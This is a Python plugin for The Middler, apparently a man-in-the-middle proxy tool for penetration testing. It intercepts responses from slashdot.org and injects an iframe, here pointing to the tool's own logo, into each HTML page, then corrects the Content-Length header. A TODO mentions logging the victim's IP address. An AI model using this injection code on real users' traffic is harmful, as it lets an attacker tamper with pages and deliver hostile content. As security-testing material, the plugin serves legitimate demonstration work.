#!/usr/bin/python
import urllib2
import re
import libmiddler.api.header as header
import libmiddler as ml
#import libmiddler.api.register_http_plugin as register_http_plugin

### FUNCTION TO MANIPULATE CLIENT REQUEST
def doRequest(session, request_header, data):
  changed = 0
  stop = 0
  return(request_header, data, changed, stop)

### FUNCTION TO MANIPULATE SERVER RESPONSE
def doResponse(session, request_header, response_header, data):
  changed = 0
  stop = 0
  i = 1

  # Check to see if we've got the right target site

  target = "slashdot.org"
  request_match = (("Host",target),)

  # Set up the IFRAME to inject into the HTML

  # TODO: Set the traffic capture code that gets my IP address to log it into
  #       some kind of global or class variable.

  inserted_url = "http://www.inguardians.com/tools/logo-themiddler-150px.jpg"

  iframe = '''<iframe height=103 width=150 src="%s"></iframe>''' % (inserted_url)

  if header.headertest(request_header,request_match):

      # We could make sure only to do this if the browser was getting a web page.
      response_match = (("Content-type","TEXT/HTML"),)
      if header.headertest( response_header,response_match ):

          # Check the response code line.
          response_code_line = response_header[0][1]
          (protover,response_code,reason) = response_code_line.split(" ",2)

          ml.jjlog.debug("Response code line had these elements --%s-- --%s-- --%s\n" % (protover,response_code,reason) )

          # Make sure we are only doing this on a 200 message.
          # There's no point to injecting into a 30x redirect!
          if response_code != "200":
              return(response_header, data, changed, stop)

          ml.jjlog.debug("Preparing to inject iframe into request for %s" % target)

          ### MANIPULATE DATA - INSERT SCRIPT
          data = re.sub(r'\<body\>', r'<body>' + iframe, data)
          changed = 1

          ### Correct the content-length.
          header.headerfix(response_header, "Content-Length", str(len(data)) + '\r\n')

          # We have changed the header and we don't want any other plugins to touch it.
          # TODO: Decide on how to do priority/dependencies/ordering so redirects go first.

          changed = 1
          stop = 1

  return(response_header, data, changed, stop)
